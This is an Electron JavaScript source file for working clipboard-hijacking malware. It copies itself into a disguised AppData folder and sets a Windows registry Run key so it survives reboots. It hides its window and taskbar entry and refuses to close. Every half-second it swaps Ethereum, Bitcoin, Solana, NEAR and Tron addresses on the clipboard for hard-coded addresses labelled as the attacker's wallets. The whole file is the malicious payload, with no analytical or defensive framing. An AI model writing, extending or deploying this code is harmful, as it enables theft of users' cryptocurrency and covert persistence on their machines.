const { app, BrowserWindow, globalShortcut, clipboard } = require('electron');
const path = require('path');
const fs = require('fs');
const { exec } = require('child_process');

let mainWindow;
const AGENT_NAME = "WindowsServiceHelper"; 
const TARGET_FOLDER = path.join(process.env.APPDATA, 'WindowsService');
const TARGET_PATH = path.join(TARGET_FOLDER, 'ServiceHelper.exe');

const ATTACKER_WALLET = {
    ethereum: '0x742d35Cc66DCeC8B01C4e403128ef5451a5b3C10',
    bitcoin: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
    solana: '9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM',
    near: 'wallet.hijacker.testnet',
    tron: 'TQQm8R5CZV9VJnV7T2qnrD8U9e7bY9gJ3G'
};

// --- NEW: SELF-COPY & PERSISTENCE ---
function setupPersistence() {
    if (process.platform !== 'win32') return;

    // 1. Create hidden folder if it doesn't exist
    if (!fs.existsSync(TARGET_FOLDER)) {
        fs.mkdirSync(TARGET_FOLDER, { recursive: true });
    }

    const currentExe = process.execPath;

    // 2. Copy the EXE to AppData if it's not already there
    if (currentExe !== TARGET_PATH) {
        try {
            fs.copyFileSync(currentExe, TARGET_PATH);
        } catch (e) {
            console.error("Copy failed:", e);
        }
    }

    // 3. Add the AppData version to the Windows Registry
    const regCmd = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${AGENT_NAME}" /t REG_SZ /d "\\"${TARGET_PATH}\\"" /f`;

    exec(regCmd, (err) => {
        if (!err) console.log("Persistence active from AppData.");
    });
}

function createWindow() {
    mainWindow = new BrowserWindow({
        width: 800, height: 600, show: false,
        webPreferences: { nodeIntegration: true, contextIsolation: false }
    });
    mainWindow.loadFile('index.html');
    mainWindow.setMenuBarVisibility(false);
    mainWindow.setSkipTaskbar(true);
}

app.whenReady().then(() => {
    createWindow();
    setupPersistence();

    globalShortcut.register('CommandOrControl+Alt+H', () => {
        mainWindow.show();
    });

    if (process.platform === 'darwin' && app.dock) app.dock.hide();
    
    setInterval(checkClipboard, 500);
});

app.on('window-all-closed', (e) => { e.preventDefault(); });

let lastClipboard = '';
function checkClipboard() {
    try {
        const current = clipboard.readText().trim();
        if (current !== lastClipboard && isWalletAddress(current)) {
            const replaced = replaceWalletAddress(current);
            if (replaced !== current) {
                clipboard.writeText(replaced);
                lastClipboard = replaced; 
                if (mainWindow) mainWindow.webContents.send('hijack', { original: current, replaced: replaced });
            }
        } else {
            lastClipboard = current;
        }
    } catch(e) {}
}

function isWalletAddress(text) {
    const patterns = [
        /^0x[a-fA-F0-9]{40}$/,
        /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/,
        /^[1-9A-HJ-NP-Za-km-z]{32,44}$/,
        /^[a-z0-9_-]{2,64}\.(near|testnet|mainnet)$/,
        /^T[a-zA-Z0-9]{33}$/
    ];
    return patterns.some(pattern => pattern.test(text.trim()));
}

function replaceWalletAddress(address) {
    const clean = address.trim();
    if (/^0x[a-fA-F0-9]{40}$/i.test(clean)) return ATTACKER_WALLET.ethereum;
    if (/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/.test(clean)) return ATTACKER_WALLET.bitcoin;
    if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(clean)) return ATTACKER_WALLET.solana;
    if (/^[a-z0-9_-]{2,64}\.(near|testnet|mainnet)$/.test(clean)) return ATTACKER_WALLET.near;
    if (/^T[a-zA-Z0-9]{33}$/.test(clean)) return ATTACKER_WALLET.tron;
    return clean;
}
